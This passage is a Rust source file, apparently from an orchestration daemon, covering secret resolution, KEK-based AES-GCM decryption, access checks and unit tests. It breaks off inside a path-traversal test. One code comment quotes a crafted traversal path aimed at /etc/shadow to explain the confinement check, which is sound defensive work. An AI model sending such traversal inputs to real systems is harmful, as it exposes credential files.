//! Secret resolution and injection for yubaba's containerd-spec assembly.
//!
//! Two resolvers cover the two [`SecretRef`] arms:
//!
//! - [`LocalFileResolver`] reads `SecretRef::LocalFile` from the per-machine
//!   yubaba secret store at `/var/lib/yah/yubaba/secrets/`. It cannot resolve
//!   cluster secrets and returns `SecretError::ClusterNotImplemented` for the
//!   `Cluster` arm.
//! - [`ClusterResolver`] (R600-F2 / W273) resolves *both* arms on a fleet node:
//!   `LocalFile` is delegated to an inner `LocalFileResolver`, while `Cluster`
//!   reads the raft-replicated AES-256-GCM ciphertext from the local raft
//!   replica and decrypts it with the node-local cluster KEK loaded from
//!   [`CLUSTER_KEK_PATH`]. The KEK never leaves the node; decrypted PEM exists
//!   only in the returned bytes (rendered to a tmpfs `File` mount by
//!   [`resolve_secrets`]), never in raft and never in a log.
//!
//! Call [`resolve_secrets`] with a slice of `SecretMount`s and a resolver to
//! produce a [`ContainerSecrets`] ready for containerd-spec assembly: env vars
//! are injected directly, file mounts are written into tmpfs at the specified
//! path and mode.

use std::path::{Path, PathBuf};

use workload_spec::secrets::{SecretAccess, SecretConsumer, SecretError, SecretResolver};
use workload_spec::{SecretMount, SecretRef, SecretTarget};
use zeroize::{Zeroize, Zeroizing};

use crate::raft::SecretRecord;

/// Default per-machine yubaba secret store root.
pub const SECRET_STORE_ROOT: &str = "/var/lib/yah/yubaba/secrets";

/// Reads secrets from the per-machine yubaba secret store at `root/<path>`.
///
/// The `path` in `SecretRef::LocalFile` is treated as a key relative to
/// `root`. An absolute path has its leading `/` stripped before joining so
/// callers can use either `"api-key"` or `"/api-key"` and get the same result.
pub struct LocalFileResolver {
    root: PathBuf,
}

impl LocalFileResolver {
    /// Create a resolver rooted at `root`. Production default is
    /// [`SECRET_STORE_ROOT`]; pass a temp dir in tests.
    pub fn new(root: impl Into<PathBuf>) -> Self {
        Self { root: root.into() }
    }
}

impl SecretResolver for LocalFileResolver {
    fn resolve(&self, r: &SecretRef) -> Result<Vec<u8>, SecretError> {
        match r {
            SecretRef::LocalFile { path } => {
                let rel = path.strip_prefix("/").unwrap_or(path.as_path());
                // Confine the read to `root`. The `path` rides in on a
                // WorkloadSpec, so treat it as a plain relative key: reject any
                // component that isn't a normal name (`..`, an absolute root, a
                // drive prefix). Without this, a crafted
                // `SecretRef::LocalFile { path: "../../etc/shadow" }` would
                // `root.join(..)` its way out of the store and read an arbitrary
                // file as yubaba's (root) uid.
                use std::path::Component;
                if rel
                    .components()
                    .any(|c| !matches!(c, Component::Normal(_) | Component::CurDir))
                {
                    return Err(SecretError::Io {
                        op: "resolving",
                        path: rel.to_path_buf(),
                        source: std::io::Error::new(
                            std::io::ErrorKind::InvalidInput,
                            "secret path must be a relative key within the store \
                             (no `..`, no absolute path)",
                        ),
                    });
                }
                let full = self.root.join(rel);
                std::fs::read(&full).map_err(|e| {
                    if e.kind() == std::io::ErrorKind::NotFound {
                        SecretError::NotFound { path: full }
                    } else {
                        SecretError::Io {
                            op: "reading",
                            path: full,
                            source: e,
                        }
                    }
                })
            }
            SecretRef::Cluster { .. } => Err(SecretError::ClusterNotImplemented),
        }
    }
}

// ── Cluster resolver (R600-F2 / W273) ────────────────────────────────────────

/// Default node-local cluster KEK path — exactly 32 raw bytes of AES-256-GCM
/// key material, provisioned at cluster join via cloud-init (sourced from `fob`
/// on the operator machine). Never leaves the node; decrypts the raft-
/// replicated cluster secret ciphertext.
pub const CLUSTER_KEK_PATH: &str = "/var/lib/yah/yubaba/cluster.kek";

/// Logical cluster-secret key for the issued TLS cert **chain** PEM of
/// `domain`. e.g. `cert_secret_name("yah.dev") == "tls/yah.dev/cert"`.
///
/// noisetable R118-T11: these two lived in `acme_issuer`, which is now behind
/// the `acme` feature — but they name a **cluster secret**, and the modules
/// that read that secret back (`cert_materialize`, `tenant_passway`) are not
/// ACME code and must still compile on a node that issues nothing. So the
/// naming moved down here, to the module that owns the cluster-secret store,
/// rather than being duplicated on the far side of a `#[cfg]`. One definition,
/// as before; only the owner changed.
pub fn cert_secret_name(domain: &str) -> String {
    format!("tls/{domain}/cert")
}

/// Logical cluster-secret key for the issued private **key** PEM of `domain`.
/// e.g. `key_secret_name("yah.dev") == "tls/yah.dev/key"`. See
/// [`cert_secret_name`] for why this lives here.
pub fn key_secret_name(domain: &str) -> String {
    format!("tls/{domain}/key")
}

/// Why a [`ClusterSecretStore`] could not answer — as opposed to answering
/// "absent" (R911-F1).
///
/// The store used to return a bare `Option`, so an object-store outage and a
/// record that was never written read identically. That is survivable for a
/// deploy, which fails closed either way, and fatal for a caller that acts on
/// absence (`headscale_state::materialize_noise_key` mints a fresh identity).
/// Every variant here maps to [`SecretError::ClusterUnavailable`] at the
/// resolver, never to `ClusterNotFound`.
#[derive(Debug, thiserror::Error)]
pub enum SecretStoreError {
    /// This node has no fleet object store configured (`YUBABA_CERT_STORE_*`
    /// unset), so it has no cluster-secret rail at all.
    #[error(
        "this node has no cluster secret store configured (set YUBABA_CERT_STORE_*); cluster \
         secrets cannot be read here"
    )]
    Unconfigured,

    /// This node declares no sovereign group (`--sovereign-group`). Cluster
    /// secrets are keyed per group and there is deliberately no default group
    /// (see [`crate::fleet_secrets`]), so this node has no cluster-secret rail.
    #[error(
        "this node declares no sovereign group (--sovereign-group); cluster secrets are keyed \
         per group and cannot be read here"
    )]
    NoSovereignGroup,

    /// `name` cannot be a store key: empty, absolute, or holding an empty,
    /// `.` or `..` segment — or a `tls/` name that is not `tls/<domain>/cert`
    /// or `tls/<domain>/key`.
    #[error("{name:?} is not a valid cluster secret name")]
    InvalidName { name: String },

    /// The node's sovereign group cannot be one object-key segment.
    #[error("sovereign group {group:?} cannot be a cluster secret store key segment")]
    InvalidGroup { group: String },

    /// The backing object store failed (network, auth, protocol).
    #[error("cluster secret store backend: {0}")]
    Backend(#[from] yah_object_store::Error),

    /// An object exists at the key but is not a sealed record. A hard error,
    /// never a miss.
    #[error("cluster secret store: malformed record at {key}: {source}")]
    Malformed {
        key: String,
        #[source]
        source: serde_json::Error,
    },
}

/// Read-only view over the fleet's cluster-secret store (R600-F1, R911-F1).
///
/// Abstracted as a trait so [`ClusterResolver`] is unit-testable without a
/// bucket. The production impl is
/// [`FleetSecretStore`](crate::fleet_secrets::FleetSecretStore) — the one store
/// every cluster secret resolves from.
pub trait ClusterSecretStore {
    /// The ciphertext record stored under `name`: `Ok(None)` only when the
    /// store answered and holds nothing, `Err` when it could not answer.
    fn get_secret(&self, name: &str) -> Result<Option<SecretRecord>, SecretStoreError>;
}


/// Resolves both secret arms on a fleet node:
///
/// - `SecretRef::LocalFile` → delegated to an inner [`LocalFileResolver`].
/// - `SecretRef::Cluster` → read the AES-256-GCM ciphertext from the fleet
///   secret store ([`ClusterSecretStore`], in production
///   [`FleetSecretStore`](crate::fleet_secrets::FleetSecretStore)) and decrypt
///   it with the node-local KEK.
///
/// The KEK is held for the resolver's lifetime as [`Zeroizing`] key material
/// (scrubbed on drop), is never logged, and never leaves the node. Every
/// failure mode — missing secret, wrong KEK, tampered ciphertext, malformed
/// nonce, **denied by access rule** — fails closed with an error that carries
/// only the logical secret name.
///
/// R706 (W294): the resolver is bound to a [`SecretConsumer`] — the identity of
/// the workload it is resolving *for* — and every `Cluster` read is checked
/// against the record's [`SecretAccess`] rule before the KEK is touched. The
/// consumer is a required constructor argument on purpose: there is no way to
/// build a cluster resolver that skips the check, so a future call site cannot
/// accidentally reintroduce the bearer-reference behaviour by forgetting to
/// opt in.
///
/// @yah:ticket(R911-F1, "FleetSecretStore: one object-store read path for every cluster secret; trait returns Result")
/// @yah:status(review)
/// @yah:at(2026-09-15T04:14:50Z)
/// @yah:assignee(agent:bundle-anthropic-ashguard)
/// @yah:parent(R911)
/// @yah:next("Tier: Warrior — cross-module trait change with a fail-closed security invariant and a headscale identity hazard.")
/// @yah:next("Change ClusterSecretStore::get_secret to return Result<Option<SecretRecord>, _>. The Option-only trait reads an R2 outage as absent (see the warn at cert_store.rs impl ClusterSecretStore for ObjectCertStore). Fix every impl and caller.")
/// @yah:next("Add FleetSecretStore { objects: Arc<dyn ObjectStore>, issuer, group }: tls/<domain>/{cert,key} keeps cert_store::object_key's certs/<issuer>/<domain>/*.sealed; every other name maps to secrets/<group>/<name>.sealed (reject `..`, empty, or absolute segments). group = the node's sovereign_group (main.rs:1545 with_sovereign_group), else the literal `default`. Give it read/write/delete/index verbs; index yields (name, updated_at, access summary, digest).")
/// @yah:next("Delete impl ClusterSecretStore for YubabaStateMachine, for ObjectCertStore, and LayeredSecretStore (plus its tests). Rebuild every resolver site on FleetSecretStore: lib.rs:4703 and the container call site it references, secret_reload.rs:269, cert_materialize.rs:290, leader.rs noise_key_resolver. A node with no cert-store config has no cluster-secret rail and fails closed with a named error.")
/// @yah:next("headscale_state::materialize_noise_key: a store ERROR must never mint a fresh noise identity. Refuse or retry, and log which.")
/// @yah:verify("cargo test -p yubaba --lib (from oss/yubaba) green vs baseline; new tests cover the key mapping, traversal rejection, Err-is-not-absent, and headscale not minting on Err.")
/// @yah:verify("Code-only grep for LayeredSecretStore finds nothing.")
/// @yah:files(oss/yubaba/crates/yubaba/src/secrets.rs)
/// @yah:files(oss/yubaba/crates/yubaba/src/cert_store.rs)
/// @yah:files(oss/yubaba/crates/yubaba/src/lib.rs)
/// @yah:files(oss/yubaba/crates/yubaba/src/leader.rs)
/// @yah:files(oss/yubaba/crates/yubaba/src/headscale_state.rs)
/// @yah:handoff("LANDED (read side only). New module oss/yubaba/crates/yubaba/src/fleet_secrets.rs: FleetSecretStore { objects, issuer, group } with object_key, read_secret, write_secret, delete_secret, index() -> Vec<SecretIndexRow { name, updated_at, access (SecretAccess::summary), digest: Option<hex> }>, for_node(&ServerState) -> Option<Self> (group = sovereign_group or DEFAULT_GROUP \"default\"), and impl ClusterSecretStore. tls/<domain>/{cert,key} go through cert_store::object_key (certs/<issuer>/<domain>/*.sealed); every other name goes to secrets/<group>/<name>.sealed. A test_support::UnreachableObjectStore (cfg(test)) simulates an outage.")
/// @yah:handoff("TRAIT: secrets.rs ClusterSecretStore::get_secret now returns Result<Option<SecretRecord>, SecretStoreError> (new enum: Unconfigured, InvalidName, InvalidGroup, Backend, Malformed). ClusterResolver maps Ok(None) to ClusterNotFound and any Err to the NEW workload_spec SecretError::ClusterUnavailable { name }, logging the store detail on the node. That variant lives in oss/yah-base/crates/workload-spec/src/secrets.rs, which is outside the ticket's file list but necessary: a distinct, name-only, fail-closed error. It is not an existence oracle, since an outage answers the same for every name.")
/// @yah:handoff("DELETED: impl ClusterSecretStore for YubabaStateMachine, impl for ObjectCertStore, LayeredSecretStore, the Arc blanket impl, and their tests (FakeRaft, layered_prefers_raft..., raft_shadows...). The Option<S> blanket impl moved to secrets.rs, and its semantics CHANGED: None now answers Err(Unconfigured) instead of 'holds nothing'. That makes a node with no YUBABA_CERT_STORE_* fail closed by name at resolve time.")
/// @yah:handoff("RESOLVER SITES rebuilt on FleetSecretStore::for_node(state): lib.rs build_secret_resolver (the raft cluster_state precondition is removed; the 'container call site' comment referred to this same shared function, which is the only one); secret_reload::run/reload_once (now take &Option<FleetSecretStore>); cert_materialize::run/materialize_once (adds a warn-level ClusterUnavailable arm, plus an error log at startup when there is no store); leader.rs noise_key_resolver (returns None only when there is no KEK). raft PutSecret, subscribe_secrets (still the wake signal in reload/materialize), acme_issuer writes and list_secrets were NOT touched.")
/// @yah:handoff("HEADSCALE HAZARD: headscale_state::materialize_noise_key maps ClusterUnavailable to the new NoiseKeyError::StoreUnavailable. It REFUSES to start (start_headscale logs it and returns NoiseIdentity error) whether or not a key is on disk, and never reaches the Fresh/mint verdict. A KEK plus no cert-store config also refuses.")
/// @yah:handoff("DESIGN CALLS: (a) the whole tls/ namespace is reserved. A tls/ name that is not tls/<domain>/{cert,key} is InvalidName rather than falling through to secrets/<group>/, so one name never has two candidate keys. (b) Names reject empty, '.', '..', a leading '/', backslash and control chars. cert_store::is_safe_domain now also rejects a bare '.'. (c) The group is validated lazily (InvalidGroup at first use) so construction stays infallible. (d) index() skips claim objects, other groups and non-roundtripping keys; a malformed record is an Err, not a skipped row. (e) The module lives in its own file rather than in cert_store.rs (already ~1900 lines).")
/// @yah:verify("BASELINE before edits: cargo test -p yubaba --lib (oss/yubaba) = 946 passed / 0 failed, EXIT=0.")
/// @yah:verify("AFTER: cargo test -p yubaba --lib = 961 passed / 0 failed, EXIT=0 (+15: 14 in fleet_secrets, secrets::a_store_error_is_unavailable_not_absent, headscale_state::a_store_outage_refuses_to_start_and_never_mints and ::the_real_resolver_over_a_down_or_missing_store_refuses_to_start, minus the 2 deleted layered tests).")
/// @yah:verify("cargo check -p yubaba --all-targets EXIT=0, no new yubaba warnings. cargo check -p yubaba --features testing --lib --tests EXIT=0. cargo test -p yubaba --features testing --lib secret_reload = 2 passed (the feature-gated rotation tests, now seeded through FleetSecretStore over InMemoryObjectStore).")
/// @yah:verify("Code-only grep for LayeredSecretStore across oss/app/crates (doc/annotation lines stripped) = 0.")
/// @yah:gotcha("ROLL HAZARD: this build reads cluster secrets ONLY from R2. Deploying it before the migration ticket has copied each group's raft secret map to secrets/<group>/ (and the tls/yah.dev pair to certs/<issuer>/) makes every cluster-secret deploy fail ClusterNotFound, and makes headscale fall to LocalOnly/Fresh when the record is genuinely absent. It also makes any node without YUBABA_CERT_STORE_* refuse to start headscale and refuse cluster-secret deploys. Do not roll F1 alone: migration first, per R911's ROLL note.")
/// @yah:gotcha("BLOCKING I/O: FleetSecretStore reads go through reqwest::blocking on the calling thread. They are now used in async contexts (deploy handler, secret_reload, cert_materialize via its async run, start_headscale). The deploy path already did this for the R779 TLS fallback, but it now happens for every cluster secret. Consider spawn_blocking if a tokio worker stall shows up.")
/// @yah:gotcha("yah build run could not start the camp daemon's TaskRun store (turso short read on page 24050), so builds ran locally outside the camp queue. That is a camp-daemon problem, not this ticket's.")
pub struct ClusterResolver<S: ClusterSecretStore> {
    store: S,
    kek: Zeroizing<[u8; 32]>,
    local: LocalFileResolver,
    consumer: SecretConsumer,
}

impl<S: ClusterSecretStore> ClusterResolver<S> {
    /// Build a resolver from an already-loaded 32-byte KEK, serving `consumer`.
    /// Prefer [`ClusterResolver::from_kek_file`] in production; this constructor
    /// exists for tests and callers that hold the key by other means.
    ///
    /// Accepts anything convertible into `Zeroizing<[u8; 32]>` so a caller
    /// holding the key in a `Zeroizing` wrapper (e.g. from [`load_cluster_kek`])
    /// can move it in without materialising an unprotected plain-array copy on
    /// the stack.
    pub fn new(
        store: S,
        kek: impl Into<Zeroizing<[u8; 32]>>,
        local: LocalFileResolver,
        consumer: SecretConsumer,
    ) -> Self {
        Self {
            store,
            kek: kek.into(),
            local,
            consumer,
        }
    }

    /// Load the node-local KEK from `kek_path` and build a resolver whose
    /// `LocalFile` arm is rooted at `local_store_root` (production default:
    /// [`SECRET_STORE_ROOT`]) and whose `Cluster` arm serves `consumer`. Fails
    /// closed if the KEK is missing or malformed.
    pub fn from_kek_file(
        store: S,
        kek_path: impl AsRef<Path>,
        local_store_root: impl Into<PathBuf>,
        consumer: SecretConsumer,
    ) -> Result<Self, SecretError> {
        // Move the `Zeroizing`-wrapped key straight in — no plain-array copy.
        let kek = load_cluster_kek(kek_path.as_ref())?;
        Ok(Self::new(
            store,
            kek,
            LocalFileResolver::new(local_store_root),
            consumer,
        ))
    }

    /// Read + decrypt the cluster secret named `name`. Returns plaintext bytes
    /// on success; every failure is a fail-closed `SecretError` naming only the
    /// logical secret.
    fn resolve_cluster(&self, name: &str) -> Result<Vec<u8>, SecretError> {
        let rec = match self.store.get_secret(name) {
            Ok(Some(rec)) => rec,
            Ok(None) => {
                return Err(SecretError::ClusterNotFound {
                    name: name.to_string(),
                })
            }
            // R911-F1: an unanswerable store is NOT an absent record. The detail
            // (backend error, malformed key) stays in the node's log; the
            // returned error carries only the logical name.
            Err(e) => {
                tracing::warn!(
                    secret = %name,
                    error = %e,
                    "cluster secret store could not be read; failing closed as unavailable"
                );
                return Err(SecretError::ClusterUnavailable {
                    name: name.to_string(),
                });
            }
        };
        open_cluster_secret(&self.kek, name, &rec, &self.consumer)
    }
}

/// Authorize and decrypt one already-read [`SecretRecord`] — the inverse of
/// [`seal_cluster_secret`], and **the only place a sealed record is opened**.
///
/// Extracted from [`ClusterResolver::resolve_cluster`] by R852-F3, which needs
/// the same operation against a record read outside the resolver: a per-domain
/// tenant cert read with
/// [`ObjectCertStore::read_secret`](crate::cert_store::ObjectCertStore::read_secret)
/// by a caller that must tell "no cert issued yet" from "the bucket is
/// unreachable" itself.
///
/// A second decryption path is exactly the kind of code that drifts — the
/// authorize-before-KEK ordering, the nonce-length guard and the deliberately
/// opaque failure are all load-bearing and all easy to omit on a re-write — so
/// there is one function and both callers go through it.
///
/// R706 (W294): the access rule is checked BEFORE the KEK is touched. Ordering
/// matters — a denied read must not exercise the key at all, so a rule violation
/// cannot be distinguished from a missing secret by timing either. The refusal
/// is logged on the node (the operator's own audit trail) while the returned
/// error stays opaque, so a probing caller cannot map the namespace.
pub fn open_cluster_secret(
    kek: &[u8; 32],
    name: &str,
    rec: &SecretRecord,
    consumer: &SecretConsumer,
) -> Result<Vec<u8>, SecretError> {
    if !rec.access.admits(consumer) {
        tracing::warn!(
            secret = %name,
            workload = %consumer.workload,
            tenant = %consumer.tenant.0,
            namespace = %consumer.namespace.0,
            rule = %rec.access.summary(),
            "cluster secret refused: workload is not admitted by the secret's access rule"
        );
        return Err(SecretError::Forbidden {
            name: name.to_string(),
        });
    }

    // R911-F4: open under the name being resolved and the rule ON THE RECORD.
    // The check above trusted that rule; this is where it is authenticated. A
    // widened rule, or a ciphertext copied here from another name, passed the
    // check and now fails the tag. A wrong KEK, tampered bytes, or a malformed
    // nonce fail the same way. The error is opaque on purpose — no key, nonce,
    // or ciphertext is logged — and carries only the name.
    workload_spec::secrets::open(
        kek,
        &rec.nonce,
        &rec.ciphertext,
        &workload_spec::secrets::secret_aad(name, &rec.access),
    )
    .map_err(|_| SecretError::ClusterDecrypt {
        name: name.to_string(),
    })
}

impl<S: ClusterSecretStore> SecretResolver for ClusterResolver<S> {
    fn resolve(&self, r: &SecretRef) -> Result<Vec<u8>, SecretError> {
        match r {
            SecretRef::LocalFile { .. } => self.local.resolve(r),
            SecretRef::Cluster { name } => self.resolve_cluster(name),
        }
    }
}

// Redact the KEK from debug output — it must never reach a log line.
impl<S: ClusterSecretStore> std::fmt::Debug for ClusterResolver<S> {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("ClusterResolver")
            .field("kek", &"<redacted>")
            .field("consumer", &self.consumer)
            .finish_non_exhaustive()
    }
}

/// Load the node-local cluster KEK (exactly 32 bytes) from `path`.
///
/// Fails closed on missing / unreadable / wrong-size input; the returned error
/// carries a generic reason and never the key bytes. Both the intermediate read
/// buffer and the returned key are [`Zeroizing`], so no un-scrubbed copy of the
/// key survives past its use.
pub fn load_cluster_kek(path: &Path) -> Result<Zeroizing<[u8; 32]>, SecretError> {
    let mut raw = std::fs::read(path).map_err(|e| SecretError::Kek {
        reason: format!("cannot read {}: {}", path.display(), e.kind()),
    })?;

    if raw.len() != 32 {
        let len = raw.len();
        raw.zeroize();
        return Err(SecretError::Kek {
            reason: format!("expected 32 bytes, got {len}"),
        });
    }
    // Copy straight into the zeroizing target — no intermediate bare `[u8; 32]`
    // that would survive a move un-scrubbed on the stack (a `try_from` into a
    // plain array leaves the source slot holding the key until reuse).
    let mut kek = Zeroizing::new([0u8; 32]);
    kek.copy_from_slice(&raw);
    raw.zeroize();
    Ok(kek)
}

/// AES-256-GCM-seal `plaintext` under `kek` into a fresh [`SecretRecord`]
/// (R600-F3 / W273) — the issuer-side inverse of [`ClusterResolver`]'s open
/// path. The elected ACME issuer calls this on a freshly-issued cert+key PEM,
/// then writes the record into raft via `YubabaRequest::PutSecret`; every other
/// node reverses it with the node-local KEK.
///
/// A cryptographically-random 12-byte nonce is drawn per call, so re-sealing the
/// same plaintext (a renewal) never reuses a nonce — the GCM nonce-reuse footgun
/// is closed by construction at the one site that seals. `updated_at` is the
/// caller-stamped unix-seconds issuance time (used by F4 to detect rotation).
///
/// Returns the record directly: AES-256-GCM encryption of KB-scale PEM cannot
/// fail (the only `aead` error is a plaintext-length overflow far beyond any
/// cert), so there is no fail path to surface here.
///
/// R706 (W294): `access` is a required argument, not an `Option` with a
/// convenient default. Sealing and authorizing are the same decision — whoever
/// knows what this plaintext *is* is the only party who knows who should get it
/// — so the type refuses to let a caller produce a record and leave the rule
/// for later. "Later" is how an unruled secret gets into raft.
/// The cipher work itself lives in `workload_spec::secrets::seal` (R706), shared
/// with the camp-side `yah cloud secret put`. Two writers, one nonce discipline.
/// This wrapper only adds the storage-record fields yubaba's raft layer owns.
///
/// `digest` lands on `None` (R720-F1): the drift check the digest exists for
/// compares a fleet record against a camp *declaration*, and an ACME-issued
/// cert is never declared by a camp — it is minted here, on the node, and has
/// nothing to drift against. `None` is `yah cloud secret status`'s
/// `unknown(pre-digest)` bucket, which exists for exactly this case.
///
/// R911-F4: `name` is the logical name the record will be resolved under. It
/// and `access` are bound into the seal as associated data
/// ([`workload_spec::secrets::secret_aad`]), so the record opens only under
/// that name with that exact rule.
pub fn seal_cluster_secret(
    kek: &[u8; 32],
    name: &str,
    plaintext: &[u8],
    updated_at: u64,
    access: SecretAccess,
) -> SecretRecord {
    let sealed = workload_spec::secrets::seal(
        kek,
        plaintext,
        &workload_spec::secrets::secret_aad(name, &access),
    );
    SecretRecord {
        ciphertext: sealed.ciphertext,
        nonce: sealed.nonce,
        updated_at,
        access,
        digest: None,
        // Both set by the caller when the plaintext is a cert chain — this fn
        // seals arbitrary bytes and cannot know. See `SecretRecord::sans` and
        // `SecretRecord::ari`.
        sans: None,
        ari: None,
    }
}

// ── Container spec output ────────────────────────────────────────────────────

/// Resolved secrets ready to inject into a containerd OCI spec.
///
/// Holds decrypted secret material (env-var values and file contents), so its
/// `Debug` impl is hand-written to redact every value — only names, paths,
/// modes, and byte lengths are printed. A stray `debug!("{secrets:?}")` in the
/// workload-start path must never leak a private key (R600-F2 trust boundary).
#[derive(Default)]
pub struct ContainerSecrets {
    /// Env vars to inject as `(name, value)` pairs. The value is the resolved
    /// secret content decoded as UTF-8 (lossy). Most secret values — tokens,
    /// passwords, PEM keys — are ASCII; prefer `File` for binary secrets.
    pub env_vars: Vec<(String, String)>,

    /// Tmpfs-backed files to mount. Each is written under a tmpfs at
    /// `path` with `mode`; the content is the raw resolved bytes.
    pub file_mounts: Vec<SecretFileMount>,
}

impl std::fmt::Debug for ContainerSecrets {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        // Print env-var names only; values are secret.
        let env_names: Vec<&str> = self.env_vars.iter().map(|(k, _)| k.as_str()).collect();
        f.debug_struct("ContainerSecrets")
            .field("env_vars", &env_names)
            .field("file_mounts", &self.file_mounts)
            .finish()
    }
}

/// A single secret mounted as a file inside the container.
pub struct SecretFileMount {
    /// Absolute path inside the container, e.g. `"/run/secrets/tls.crt"`.
    pub path: PathBuf,
    /// Unix permission bits, e.g. `0o400` for read-only by owner.
    pub mode: u32,
    /// Resolved secret bytes to write at `path`.
    pub content: Vec<u8>,
}

impl std::fmt::Debug for SecretFileMount {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        // `content` is decrypted secret material — print its length, not bytes.
        f.debug_struct("SecretFileMount")
            .field("path", &self.path)
            .field("mode", &format_args!("{:#o}", self.mode))
            .field(
                "content",
                &format_args!("<{} bytes redacted>", self.content.len()),
            )
            .finish()
    }
}

/// Resolve all `SecretMount`s in `mounts` using `resolver`, splitting results
/// into env-var injections and file mounts for containerd-spec assembly.
///
/// Returns the first `SecretError` encountered; processing stops at the first
/// failure (yubaba marks the workload `Failed` and surfaces the error via
/// `yubaba.workloads_status`).
pub fn resolve_secrets(
    mounts: &[SecretMount],
    resolver: &dyn SecretResolver,
) -> Result<ContainerSecrets, SecretError> {
    let mut out = ContainerSecrets::default();
    for mount in mounts {
        let bytes = resolver.resolve(&mount.source)?;
        match &mount.target {
            SecretTarget::EnvVar { name } => {
                // Lossy UTF-8 conversion: most secret values are printable ASCII.
                // Non-UTF-8 secrets should use SecretTarget::File instead.
                let value = String::from_utf8_lossy(&bytes).into_owned();
                out.env_vars.push((name.clone(), value));
            }
            SecretTarget::File { path, mode } => {
                out.file_mounts.push(SecretFileMount {
                    path: path.clone(),
                    mode: *mode,
                    content: bytes,
                });
            }
        }
    }
    Ok(out)
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use workload_spec::SecretRef;

    /// In-memory resolver backed by a HashMap keyed on the `SecretRef::LocalFile`
    /// path. `SecretRef::Cluster` always returns `ClusterNotImplemented`.
    struct FakeResolver {
        secrets: std::collections::HashMap<PathBuf, Vec<u8>>,
    }

    impl FakeResolver {
        fn new() -> Self {
            Self {
                secrets: std::collections::HashMap::new(),
            }
        }

        fn with(mut self, path: &str, value: &[u8]) -> Self {
            self.secrets.insert(PathBuf::from(path), value.to_vec());
            self
        }
    }

    impl SecretResolver for FakeResolver {
        fn resolve(&self, r: &SecretRef) -> Result<Vec<u8>, SecretError> {
            match r {
                SecretRef::LocalFile { path } => self
                    .secrets
                    .get(path)
                    .cloned()
                    .ok_or_else(|| SecretError::NotFound { path: path.clone() }),
                SecretRef::Cluster { .. } => Err(SecretError::ClusterNotImplemented),
            }
        }
    }

    #[test]
    fn env_var_injection() {
        let resolver = FakeResolver::new().with("/api-key", b"super-secret");
        let mounts = vec![SecretMount {
            source: SecretRef::LocalFile {
                path: "/api-key".into(),
            },
            target: SecretTarget::EnvVar {
                name: "API_KEY".into(),
            },
        }];

        let resolved = resolve_secrets(&mounts, &resolver).unwrap();

        assert_eq!(resolved.env_vars.len(), 1, "one env var injected");
        assert_eq!(resolved.env_vars[0].0, "API_KEY");
        assert_eq!(resolved.env_vars[0].1, "super-secret");
        assert!(resolved.file_mounts.is_empty(), "no file mounts expected");
    }

    #[test]
    fn file_mount() {
        let resolver = FakeResolver::new().with("/db-password", b"hunter2");
        let mounts = vec![SecretMount {
            source: SecretRef::LocalFile {
                path: "/db-password".into(),
            },
            target: SecretTarget::File {
                path: "/run/secrets/db".into(),
                mode: 0o600,
            },
        }];

        let resolved = resolve_secrets(&mounts, &resolver).unwrap();

        assert!(resolved.env_vars.is_empty(), "no env vars expected");
        assert_eq!(resolved.file_mounts.len(), 1, "one file mount expected");
        assert_eq!(
            resolved.file_mounts[0].path,
            PathBuf::from("/run/secrets/db")
        );
        assert_eq!(resolved.file_mounts[0].mode, 0o600);
        assert_eq!(resolved.file_mounts[0].content, b"hunter2");
    }

    #[test]
    fn multiple_mounts_split_correctly() {
        let resolver = FakeResolver::new()
            .with("/api-key", b"token-value")
            .with("/tls-cert", b"-----BEGIN CERTIFICATE-----");
        let mounts = vec![
            SecretMount {
                source: SecretRef::LocalFile {
                    path: "/api-key".into(),
                },
                target: SecretTarget::EnvVar {
                    name: "API_TOKEN".into(),
                },
            },
            SecretMount {
                source: SecretRef::LocalFile {
                    path: "/tls-cert".into(),
                },
                target: SecretTarget::File {
                    path: "/run/secrets/tls.crt".into(),
                    mode: 0o400,
                },
            },
        ];

        let resolved = resolve_secrets(&mounts, &resolver).unwrap();

        assert_eq!(resolved.env_vars.len(), 1);
        assert_eq!(resolved.env_vars[0].0, "API_TOKEN");
        assert_eq!(resolved.file_mounts.len(), 1);
        assert_eq!(
            resolved.file_mounts[0].path,
            PathBuf::from("/run/secrets/tls.crt")
        );
        assert_eq!(resolved.file_mounts[0].mode, 0o400);
    }

    #[test]
    fn missing_secret_returns_not_found() {
        let resolver = FakeResolver::new().with("/other-key", b"value");
        let mounts = vec![SecretMount {
            source: SecretRef::LocalFile {
                path: "/missing".into(),
            },
            target: SecretTarget::EnvVar { name: "KEY".into() },
        }];

        let err = resolve_secrets(&mounts, &resolver).unwrap_err();
        assert!(
            matches!(err, SecretError::NotFound { .. }),
            "expected NotFound, got {err}"
        );
    }

    #[test]
    fn cluster_secret_returns_not_implemented() {
        let resolver = FakeResolver::new();
        let mounts = vec![SecretMount {
            source: SecretRef::Cluster {
                name: "cluster-secret".into(),
            },
            target: SecretTarget::EnvVar {
                name: "CLUSTER_KEY".into(),
            },
        }];

        let err = resolve_secrets(&mounts, &resolver).unwrap_err();
        assert!(
            matches!(err, SecretError::ClusterNotImplemented),
            "expected ClusterNotImplemented, got {err}"
        );
    }

    #[test]
    fn local_file_resolver_reads_from_store() {
        let tmp = tempfile::TempDir::new().unwrap();
        std::fs::write(tmp.path().join("db-password"), b"secret-value").unwrap();

        let resolver = LocalFileResolver::new(tmp.path());
        let result = resolver
            .resolve(&SecretRef::LocalFile {
                path: "db-password".into(),
            })
            .unwrap();
        assert_eq!(result, b"secret-value");
    }

    #[test]
    fn local_file_resolver_strips_leading_slash() {
        let tmp = tempfile::TempDir::new().unwrap();
        std::fs::write(tmp.path().join("api-key"), b"token123").unwrap();

        let resolver = LocalFileResolver::new(tmp.path());
        // Absolute-style path ("/api-key") resolves the same as relative "api-key".
        let result = resolver
            .resolve(&SecretRef::LocalFile {
                path: "/api-key".into(),
            })
            .unwrap();
        assert_eq!(result, b"token123");
    }

    #[test]
    fn local_file_resolver_rejects_path_traversal() {
        // A crafted secret key must not escape the store root via `..`. Plant a
        // file just outside root and confirm no traversal reaches it.
        let tmp = tempfile::TempDir::new().unwrap();
        let root = tmp.path().join("store");
        std::fs::create_dir(&root).unwrap();
        std::fs::write(tmp.path().join("outside-secret"), b"leaked").unwrap();

        let resolver = LocalFileResolver::new(&root);
        for evil in [
